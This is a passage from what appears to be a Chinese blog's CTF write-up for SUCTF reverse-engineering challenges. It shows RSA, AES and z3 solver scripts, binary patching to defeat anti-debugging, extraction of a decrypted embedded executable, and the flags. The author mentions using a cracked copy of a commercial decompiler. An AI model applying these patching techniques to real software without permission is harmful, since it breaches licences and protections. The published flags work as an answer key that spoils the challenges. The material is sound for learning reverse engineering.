class="hljs-number">0x9FCC401F</span>, <span class="hljs-number">0xD8BF92EF</span>&#125;<span class="hljs-comment">;</span><br>    memcpy(tmp+<span class="hljs-number">26</span>,cipher,<span class="hljs-number">16</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-keyword">int</span> i<span class="hljs-comment">;</span><br>    for(i=<span class="hljs-number">25</span><span class="hljs-comment">;i&gt;=0;i--)</span><br>    &#123;<br>        tmp[i] = sub_564F32EDB43B(tmp[i+<span class="hljs-number">4</span>],tmp[i+<span class="hljs-number">1</span>],tmp[i+<span class="hljs-number">2</span>],tmp[i+<span class="hljs-number">3</span>])<span class="hljs-comment">;</span><br>    &#125;<br>    printf(<span class="hljs-string">&quot;%s&quot;</span>,tmp)<span class="hljs-comment">;</span><br>    return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>需要注意的是v1为unsigned int<br>如果写int答案就错。。。莫名其妙<br>玄学问题<br>大部分还是靠着复制的伪代码<br>ida.h的头文件自己加上就好了<br>这算法真简单。。。<br>自家还是太懒了不肯耐心看下去。。。</p>
<h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><p>这次suctf ak了re 俩个三血，还是挺满足的，同时也学到了许多新东西</p>
<h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>猜。。。<br>这题真是猜的。。。<br>看到65537可以联想到rsa，还有那个gmp库</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-attribute">import</span> gmpy<span class="hljs-number">2</span><br><br><span class="hljs-attribute">p1</span> = <span class="hljs-number">282164587459512124844245113950593348271</span>                    #模数<br><span class="hljs-attribute">p2</span> = <span class="hljs-number">366669102002966856876605669837014229419</span><br><span class="hljs-attribute">n</span> = <span class="hljs-number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span>      #n<br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span>                                                        #e<br><span class="hljs-attribute">phi_n</span> = (p<span class="hljs-number">1</span> - <span class="hljs-number">1</span>) * (p<span class="hljs-number">2</span> - <span class="hljs-number">1</span>)<br><span class="hljs-attribute">d</span> = gmpy<span class="hljs-number">2</span>.invert(e, phi_n)<br><br><span class="hljs-attribute">print</span> hex(d)<br><br><span class="hljs-attribute">c</span> = <span class="hljs-number">0</span>xad<span class="hljs-number">939</span>ff<span class="hljs-number">59</span>f<span class="hljs-number">6</span>e<span class="hljs-number">70</span>bcbfad<span class="hljs-number">406</span>f<span class="hljs-number">2494993757</span>eee<span class="hljs-number">98</span>b<span class="hljs-number">91</span>bc<span class="hljs-number">244184</span>a<span class="hljs-number">377520</span>d<span class="hljs-number">06</span>fc<span class="hljs-number">35</span>        #密文<br><span class="hljs-attribute">m</span> = pow(c, d, n)<br><span class="hljs-attribute">print</span> hex(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&quot;hex&quot;</span>)#hex(m)[<span class="hljs-number">2</span>:len(hex(m))-<span class="hljs-number">1</span>].decode(&#x27;hex&#x27;)<br></code></pre></td></tr></table></figure>
<p>suctf{Pwn_@_hundred_years}<br>人人人，求你pwn我一百年！！！</p>
<h2 id="hardCPP"><a href="#hardCPP" class="headerlink" title="hardCPP"></a>hardCPP</h2><p>刚看到懵逼了以为是ollvm<br>还好不难，下断点直接写<br><img src="21.png" srcset="/img/loading.gif" lazyload alt="21"><br>可以发现前面有time反调试，很明显俩边相减要是0，后面还用相减结果与输入xor<br>更说明了这一点<br>可以直接把sub esi, [rbp-28]改成xor esi, esi<br>然后是判断长度是否满足<br>最终判断逻辑就是(a[i+1] + (a[i]%7))^((a[i]^18)*3+2)<br><img src="22.png" srcset="/img/loading.gif" lazyload alt="22"></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-built_in">from</span> z3 import *<br>b = [<span class="hljs-number">0xF3</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8C</span>,<br>  <span class="hljs-number">0x40</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA5</span>]<br>s = Solver()<br><span class="hljs-keyword">a</span> = [BitVec(<span class="hljs-string">&#x27;u%d&#x27;</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">21</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>)):<br>    s.<span class="hljs-built_in">add</span>(<span class="hljs-keyword">a</span>[i]&gt;=<span class="hljs-number">32</span>)<br>    s.<span class="hljs-built_in">add</span>(<span class="hljs-keyword">a</span>[i]&lt;=<span class="hljs-number">125</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(b)):<br>    s.<span class="hljs-built_in">add</span>(b[i] == (<span class="hljs-keyword">a</span>[i+<span class="hljs-number">1</span>] + (<span class="hljs-keyword">a</span>[i]%<span class="hljs-number">7</span>))^((<span class="hljs-keyword">a</span>[i]^<span class="hljs-number">18</span>)*<span class="hljs-number">3</span>+<span class="hljs-number">2</span>))<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>print s.check()<br><span class="hljs-keyword">if</span> s.check() == sat:<br>    <span class="hljs-built_in">result</span> = s.model()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">21</span>):<br>        flag += chr(<span class="hljs-built_in">result</span>[<span class="hljs-keyword">a</span>[i]].as_long().real)<br>    print flag<br></code></pre></td></tr></table></figure>
<p>解出来#flag{mY-CurR1ed_Fns}</p>
<h2 id="Akira-Homework"><a href="#Akira-Homework" class="headerlink" title="Akira Homework"></a>Akira Homework</h2><p>这题非常规。。。<br>等别人一波wp<br>当时拿了三血<br>很明显程序有很强的反调试，isdebugpresent就不说了<br>关键是会检测ida窗口<br>只要ida打开，程序闪退<br>只能强行调试<br><img src="23.png" srcset="/img/loading.gif" lazyload alt="23"><br>可以看到puts,这边的字符串都是加密过的运行时解密输出<br>主要问题时下面scanf不能跑直接飞<br>这边选择直接跳过//反调试太猛了怼不动<br>直接进行下面语句，在内存中修改//变相scanf<br>然后发现输入前18应该为Akira_aut0_ch3ss_!<br>然后下面有判断<br>sub_7FF7198E6C10里有个解密<br>应该是虚函数<br><img src="24.png" srcset="/img/loading.gif" lazyload alt="24"><br>里面有个贼大的表，在用输入解密他<br><img src="25.png" srcset="/img/loading.gif" lazyload alt="25"><br>后来发现这应该是个pe文件调到后面有判断，这边的解密我强行调试只call一次<br>应该call三次，看表的交叉引用可以看到<br>然后利用pe文件的性质，末尾应该全是0<br>每隔三个解密pe文件，很明显看到明文输入<br><img src="26.png" srcset="/img/loading.gif" lazyload alt="26"><br>每隔三个看，可以看到Akira_aut0_ch3ss_!<br>也可以看到第二次解密传进去的参数应该是啥<br>这边我强行call三次解密<br>程序解密完后把exe提取出来<br>//没办法，反调试太鸡儿猛<br>放ida静态看exe<br><img src="27.png" srcset="/img/loading.gif" lazyload alt="27"><br>就是一个输入比较<br>其实只要调起来这题肯定很快出<br>可以发现是aes key应该是Ak1i3aS3cre7K3y<br>哪能咋办，慢慢猜呗。。。<br>cbc iv是0<br>最后猜出来</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#coding=UTF-8</span><br><span class="hljs-built_in">from</span> Crypto.Cipher import AES<br><span class="hljs-built_in">from</span> binascii import b2a_hex, a2b_hex<br><span class="hljs-comment"># 如果text不足16位的倍数就用空格补足为16位</span><br>def add_to_16(<span class="hljs-keyword">text</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">text</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) % <span class="hljs-number">16</span>:<br>        <span class="hljs-built_in">add</span> = <span class="hljs-number">16</span> - (<span class="hljs-built_in">len</span>(<span class="hljs-keyword">text</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) % <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">add</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">text</span> = <span class="hljs-keyword">text</span> + (<span class="hljs-string">&#x27;/0&#x27;</span> * <span class="hljs-built_in">add</span>)<br>    <span class="hljs-literal">return</span> <span class="hljs-keyword">text</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br><span class="hljs-comment"># 加密函数</span><br>def <span class="hljs-built_in">encrypt</span>(<span class="hljs-keyword">text</span>):<br>    key = <span class="hljs-string">&#x27;9999999999999999&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    mode = AES.MODE_CBC<br>    iv = b<span class="hljs-string">&#x27;qqqqqqqqqqqqqqqq&#x27;</span><br>    <span class="hljs-keyword">text</span> = add_to_16(<span class="hljs-keyword">text</span>)<br>    cryptos = AES.<span class="hljs-built_in">new</span>(key, mode, iv)<br>    cipher_text = cryptos.<span class="hljs-built_in">encrypt</span>(<span class="hljs-keyword">text</span>)<br>    <span class="hljs-comment"># 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串</span><br>    <span class="hljs-literal">return</span> b2a_hex(cipher_text)<br><br><br><span class="hljs-comment"># 解密后，去掉补足的空格用strip() 去掉</span><br>def <span class="hljs-built_in">decrypt</span>(<span class="hljs-keyword">text</span>):<br>    key = <span class="hljs-string">&#x27;Ak1i3aS3cre7K3y\x00&#x27;</span><br>    iv = b<span class="hljs-string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br>    mode = AES.MODE_CBC<br>    cryptos = AES.<span class="hljs-built_in">new</span>(key, mode, iv)<br>    plain_text = cryptos.<span class="hljs-built_in">decrypt</span>(a2b_hex(<span class="hljs-keyword">text</span>))<br>    <span class="hljs-literal">return</span> <span class="hljs-keyword">bytes</span>.decode(plain_text).rstrip(<span class="hljs-string">&#x27;/0&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	dd=<span class="hljs-string">&quot;94BF7A0CA43550D1C215ECEF9D9AAA56&quot;</span><br>	print <span class="hljs-built_in">decrypt</span>(dd)<br></code></pre></td></tr></table></figure>
<p>flag{Ak1rAWin!}<br>居然是三血。。。</p>
<h2 id="babyunic"><a href="#babyunic" class="headerlink" title="babyunic"></a>babyunic</h2><p>凌晨上题<br>还好有破解版的jeb<br>直接func拖进去mips 大端序<br>就能看到一开始有位运算和xor<br>然后是超大方程组<br>就是个行矩阵和一个42*42的矩阵相乘最后与行矩阵比较<br>注意最后的比较，读数据的时候应该是大端序读。。。<br><img src="28.png" srcset="/img/loading.gif" lazyload alt="28"><br>一开始以为是ida默认的小端，然后感觉不对劲怎么会这么大。。。<br>本想高斯消元解方程出答案//太多了<br>直接甩给密码队友1min出数组<br>跑一下出</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a[] = &#123;<span class="hljs-number">154</span>, <span class="hljs-number">171</span>, <span class="hljs-number">24</span>, <span class="hljs-number">161</span>, <span class="hljs-number">54</span>, <span class="hljs-number">222</span>, <span class="hljs-number">172</span>, <span class="hljs-number">116</span>, <span class="hljs-number">129</span>, <span class="hljs-number">18</span>, <span class="hljs-number">139</span>, <span class="hljs-number">152</span>, <span class="hljs-number">127</span>, <span class="hljs-number">247</span>, <span class="hljs-number">36</span>, <span class="hljs-number">124</span>, <span class="hljs-number">43</span>, <span class="hljs-number">90</span>, <span class="hljs-number">97</span>, <span class="hljs-number">138</span>, <span class="hljs-number">238</span>, <span class="hljs-number">95</span>, <span class="hljs-number">141</span>, <span class="hljs-number">237</span>, <span class="hljs-number">26</span>, <span class="hljs-number">227</span>, <span class="hljs-number">152</span>, <span class="hljs-number">154</span>, <span class="hljs-number">167</span>, <span class="hljs-number">54</span>, <span class="hljs-number">141</span>, <span class="hljs-number">166</span>, <span class="hljs-number">139</span>, <span class="hljs-number">66</span>, <span class="hljs-number">216</span>, <span class="hljs-number">129</span>, <span class="hljs-number">94</span>, <span class="hljs-number">164</span>, <span class="hljs-number">69</span>, <span class="hljs-number">188</span>, <span class="hljs-number">33</span>, <span class="hljs-number">194</span>&#125;;<br>  <span class="hljs-keyword">int</span> i,j=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">42</span>;i++)<br>  &#123;<br>      a[i]^=i;<br>      a[i] = ((a[i]&amp;<span class="hljs-number">7</span>)&lt;&lt;<span class="hljs-number">5</span>)|(a[i]&gt;&gt;<span class="hljs-number">3</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>  &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>SUCTF{Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!}</p>
<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><p>居然放在最后一题。。。未免tcl<br>不知道为什么写出来的人那么少<br>//没时间py了把<br>和de1ctf的有点太像了吧数据，截断。<br><img src="29.png" srcset="/img/loading.gif" lazyload alt="29"><br>这边俩个check第一个是检查输入是不是按照数据 符号 数据 符号 数据 这样的<br>下面一个就是第一段数据长度为10<br>isspace ispunct<br>这种函数基本可以猜出是在干啥了<br>代码量是多了点，但配合猜写的还是很快的<br>现在知道了输入条件下面看check<br><img src="30.png" srcset="/img/loading.gif" lazyload alt="30"><br>这边是第一个check<br>逻辑第一眼看上去有点矛盾又是要长度为10又是要为5<br>其实前面输入的为1就不算在这边的check长度里<br>所以前面十个输入是11111suctf<br>再看看第二个check<br>其实更简单。。。字母隔2一个输入<br>输入四个从A开始<br>所以输入应该是ACEG<br>第三个输入check就是个z3<br>输入转为一个整数然后判断</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-attribute">from</span> z<span class="hljs-number">3</span> import *<br><span class="hljs-attribute">s</span> = Solver()<br><span class="hljs-attribute">x</span> = BitVec(&#x27;x&#x27;,<span class="hljs-number">32</span>)<br><span class="hljs-attribute">s</span>.add((<span class="hljs-number">1234</span> * x + <span class="hljs-number">5678</span>) / <span class="hljs-number">4396</span> ^ <span class="hljs-number">2882395322</span> == <span class="hljs-number">2882386105</span>)<br><span class="hljs-attribute">s</span>.add((<span class="hljs-number">2334</span> * x + <span class="hljs-number">9875</span>) / <span class="hljs-number">7777</span> ^ <span class="hljs-number">305358736</span> == <span class="hljs-number">305396848</span>)<br><span class="hljs-attribute">print</span> s.check()<br><span class="hljs-attribute">print</span> s.model()<br></code></pre></td></tr></table></figure>
<p>[x = 31415926]<br>所以第三段数据是31415926<br>11111suctf_ACEG_31415926<br>输入得flag<br>suctf{ACEG31415926}<br>re结束</p>
<h1 id="suctf学习总结"><a href="#suctf学习总结" class="headerlink" title="suctf学习总结"></a>suctf学习总结</h1><p>每次打完比赛来一波总结<br>这次主要学到的新知识还挺多的<br>首先是骑驴出的俩题，一道是rsa还有一道Unicorn Engine得<br>rsa在re中的出现很少，Unicorn Engine应该是有史以来第一次把。。。<br>//听说今年nu1l的ctf也出了Unicorn Engine<br>还有就是哪个aes的反调试太猛。。。可以学一波，还有互斥体<br>具体的话看了de1ta的wp<br>rev中检查输入合格的截断方式也了解一波<br>遇到了俩次，代码量多基本都是靠猜，来好好逆向一波<br>hardcpp一点都不hard。。。看到了nu1l的wp又了解到一个脚本<br>//在通往脚本小子的路上越走越远</p>
<h2 id="Unicorn-Engine"><a href="#Unicorn-Engine" class="headerlink" title="Unicorn Engine"></a>Unicorn Engine</h2><p>先把这个写一波<br>简答来说uc就是个模拟器了，目前不怎么常见，网上也没多少科普文章<br><img src="31.png" srcset="/img/loading.gif" lazyload alt="31"></p>
<blockquote>
<blockquote>
<blockquote>
<p>print UC_ARCH_MIPS<br>3<br>可以发现是mips<br>0x400000LL代表大端序<br>把func放进破解jeb<br>就可以看到大部分逻辑<br>解法的话<br>一个是用z3<br>//当初也使用z3但是解不出<br>//后来看了别人的wp说是不能用bitvec。。。<br>//我佛了</p>
</blockquote>
</blockquote>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> z<span class="hljs-number">3</span> import *<br><br><span class="hljs-attribute">flag</span>=[Int(&#x27;flag%d&#x27;%i)for i in range(<span class="hljs-number">42</span>)]<br><span class="hljs-attribute">s</span>=[-<span class="hljs-number">108</span>,-<span class="hljs-number">200</span>,<span class="hljs-number">294</span>,-<span class="hljs-number">216</span>,-<span class="hljs-number">1008</span>,<span class="hljs-number">660</span>,-<span class="hljs-number">866</span>,<span class="hljs-number">1770</span>,<span class="hljs-number">220</span>,<span class="hljs-number">6</span>,-<span class="hljs-number">244</span>,-<span class="hljs-number">522</span>,-<span class="hljs-number">1406</span>,-<span class="hljs-number">816</span>,<span class="hljs-number">386</span>,<span class="hljs-number">990</span>,<span class="hljs-number">334</span>,<span class="hljs-number">690</span>,-<span class="hljs-number">1832</span>,<span class="hljs-number">372</span>,-<span class="hljs-number">1370</span>,-<span class="hljs-number">1580</span>,<span class="hljs-number">450</span>,-<span class="hljs-number">1668</span>,<span class="hljs-number">858</span>,<span class="hljs-number">326</span>,-<span class="hljs-number">196</span>,-<span class="hljs-number">1516</span>,<span class="hljs-number">462</span>,<span class="hljs-number">2012</span>,-<span class="hljs-number">696</span>,<span class="hljs-number">152</span>,<span class="hljs-number">2142</span>,-<span class="hljs-number">592</span>,-<span class="hljs-number">68</span>,<span class="hljs-number">878</span>,-<span class="hljs-number">178</span>,-<span class="hljs-number">1994</span>,<span class="hljs-number">1472</span>,<span class="hljs-number">1710</span>,<span class="hljs-number">1684</span>,<span class="hljs-number">34</span>]<br><span class="hljs-attribute">solver</span>=Solver()<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">0</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">1</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">2</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">3</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span 